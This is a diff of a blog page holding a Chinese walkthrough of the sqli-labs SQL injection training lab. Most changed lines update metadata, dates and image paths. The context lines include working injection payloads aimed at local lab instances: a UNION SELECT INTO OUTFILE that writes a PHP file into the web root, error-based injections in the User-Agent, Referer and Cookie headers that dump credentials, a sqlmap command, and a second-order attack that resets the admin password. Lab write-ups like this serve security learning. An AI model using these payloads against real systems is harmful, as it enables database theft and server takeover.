@@ -8,27 +8,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
     <meta name="description" content="一、搭建问题sqli-labs搭建问题：修改php版本 https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_58817560&#x2F;article&#x2F;details&#x2F;124195881 sqli-labs29关搭建问题 tomcat安装问题 推断是目录权限问题，以后要注意我的目录权限问题 sqli-labs靶场的访问 https:&#x2F;&#x2F;leihehe.top&#x2F;2021&#x2F;07&#x2F;07&#x2F;Sqli-labs%E7%A">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Sqli-Labs通过笔记">
-<meta property="og:url" content="https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:title" content="w3nq14">
+<meta property="og:url" content="https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="w3nq14">
 <meta property="og:description" content="一、搭建问题sqli-labs搭建问题：修改php版本 https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_58817560&#x2F;article&#x2F;details&#x2F;124195881 sqli-labs29关搭建问题 tomcat安装问题 推断是目录权限问题，以后要注意我的目录权限问题 sqli-labs靶场的访问 https:&#x2F;&#x2F;leihehe.top&#x2F;2021&#x2F;07&#x2F;07&#x2F;Sqli-labs%E7%A">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://w3nq14.github.io/images/15893551932887.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15893833852620.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15894186942757.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15894228024343.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15894229147799.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/1589426073817.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15895151791144.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15901641643476.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15897015756622.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15897218466276.png">
-<meta property="og:image" content="https://w3nq14.github.io/images/15897680165097.png">
-<meta property="article:published_time" content="2026-03-27T03:39:00.000Z">
-<meta property="article:modified_time" content="2026-03-29T04:51:01.012Z">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15893551932887.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15893833852620.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15894186942757.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15894228024343.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15894229147799.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/1589426073817.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15895151791144.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15901641643476.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15897015756622.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15897218466276.png">
+<meta property="og:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15897680165097.png">
+<meta property="article:published_time" content="2026-03-29T09:02:07.753Z">
+<meta property="article:modified_time" content="2026-03-29T09:02:07.755Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://w3nq14.github.io/images/15893551932887.png">
+<meta name="twitter:image" content="https://w3nq14.github.io/Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15893551932887.png">
     
     
       
@@ -48,7 +48,7 @@
       
     
     <!-- title -->
-    <title>Sqli-Labs通过笔记</title>
+    <title>w3nq14</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
@@ -95,10 +95,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2026/03/27/Penetration/HackTheBox-Linux-Walkthrough/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2026/03/29/Penetration/Upload-Labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2026/03/27/Penetration/Upload-Labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2026/03/29/Penetration/Pikachu%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -111,17 +111,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&text=Sqli-Labs通过笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&is_video=false&description=Sqli-Labs通过笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Sqli-Labs通过笔记&body=Check out this article: https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&name=Sqli-Labs通过笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&t=Sqli-Labs通过笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -141,7 +141,7 @@
   <header>
     
     <h1 class="posttitle p-name" itemprop="name headline">
-        Sqli-Labs通过笔记
+        
     </h1>
 
 
@@ -153,18 +153,13 @@
       
     <div class="postdate">
       
-        <time datetime="2026-03-27T03:39:00.000Z" class="dt-published" itemprop="datePublished">2026-03-27</time>
+        <time datetime="2026-03-29T09:02:07.753Z" class="dt-published" itemprop="datePublished">2026-03-29</time>
         
       
     </div>
 
 
       
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/Penetration/">Penetration</a>
-    </div>
-
 
       
 
@@ -190,7 +185,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -e <span class="string">&quot;select version(),user()&quot;</span></span><br><span class="line">+-------------------------+----------------+</span><br><span class="line">| version()               | user()         |</span><br><span class="line">+-------------------------+----------------+</span><br><span class="line">| 5.5.44-0ubuntu0.14.04.1 | root@localhost |</span><br><span class="line">+-------------------------+----------------+</span><br><span class="line"></span><br><span class="line">$ php --version</span><br><span class="line">PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)</span><br><span class="line">Copyright (c) 1997-2014 The PHP Group</span><br><span class="line">Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> /etc/init.d/ &amp;&amp; apache2 -v</span><br><span class="line">Server version: Apache/2.4.7 (Ubuntu)</span><br><span class="line">Server built:   Oct 14 2015 14:20:21</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux 5fd18b4e45eb 4.19.76-linuxkit <span class="comment">#1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
 
 <p>天啦撸，2020年5月13日 国光发现新版的 Docker 支持图形化的 Dashboard 管理容器了，这样操作效率就又提高了。</p>
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200513/15893551932887.png"><img src="/images/15893551932887.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200513/15893551932887.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15893551932887.png" alt="img"></a></p>
 <h2 id="效率必备"><a href="#效率必备" class="headerlink" title="效率必备"></a>效率必备</h2><ul>
 <li>抓包工具 Burpsuite，因为后面有 POST 注入，抓包方便分析</li>
 <li>老版本的 Hackerbar，半自动化手工注入必备</li>
@@ -414,7 +409,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;))+UNION+SELECT 1,2,&quot;&lt;?php phpinfo();?&gt;&quot; INTO OUTFILE &quot;/var/www/html/Less-7/info.php&quot;--+ </span></span><br></pre></td></tr></table></figure>
 
 <p>访问对应的 URL 看看是否解析了呢：</p>
-<p>Pasted image 20250117190501.png</p>
+<p>![img](.&#x2F;Sqli-Labs通过笔记.assets&#x2F;Pasted image 20250117190501.png)</p>
 <h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><table>
 <thead>
 <tr>
@@ -684,7 +679,7 @@
 <p>HTTP</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-18/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>1&#x27; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:8888/Less-18/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">uname</span><span class="operator">=</span>admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span></span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200513/15893833852620.png"><img src="/images/15893833852620.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200513/15893833852620.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15893833852620.png" alt="img"></a></p>
 <h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><table>
 <thead>
 <tr>
@@ -707,7 +702,7 @@
 <p>HTTP</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-19/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>&#x27; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">uname</span><span class="operator">=</span>admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span></span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200514/15894186942757.png"><img src="/images/15894186942757.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200514/15894186942757.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15894186942757.png" alt="img"></a></p>
 <h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><table>
 <thead>
 <tr>
@@ -730,11 +725,11 @@
 <h3 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>HTTP</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-20/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin&#x27; and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)#</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200514/15894228024343.png"><img src="/images/15894228024343.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200514/15894228024343.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15894228024343.png" alt="img"></a></p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>HTTP</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-20/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin&#x27;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)#</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>11</span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200514/15894229147799.png"><img src="/images/15894229147799.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200514/15894229147799.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15894229147799.png" alt="img"></a></p>
 <h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以国光这里就不演示了，下面直接演示 sqlmap 的注入过程吧：</p>
 <h3 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>联合查询注入</strong></p>
 <p>如果 <code>--level</code> 设置为 <strong>2</strong> 或更高，则 sqlmap 会对 HTTP <code>Cookie</code> 请求头进行 SQL 注入测试:</p>
@@ -780,7 +775,7 @@
 <p>PAYLOAD</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=sqlsec&#x27;) union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#</span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200514/1589426073817.png"><img src="/images/1589426073817.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200514/1589426073817.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/1589426073817.png" alt="img"></a></p>
 <h3 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>手工注入问题不大，那么尝试直接使用 sqlmap 来进行联合查询注入看看：</p>
 <p>BASH</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:8888/Less-21/&quot;</span> --cookie=<span class="string">&quot;uname=*&quot;</span> --tamper=<span class="string">&quot;base64encode&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure>
@@ -839,7 +834,7 @@
 <li><code>index.php</code></li>
 </ul>
 <p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p>
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200515/15895151791144.png"><img src="/images/15895151791144.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200515/15895151791144.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15895151791144.png" alt="img"></a></p>
 <p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p>
 <p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p>
 <p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p>
@@ -924,7 +919,7 @@
 
 <p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p>
 <p>接下来登录 <code>admin&#39;#hacker</code> 用户，然后来修改当前的密码：</p>
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200523/15901641643476.png"><img src="/images/15901641643476.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200523/15901641643476.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15901641643476.png" alt="img"></a></p>
 <p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p>
 <p>BASH</p>
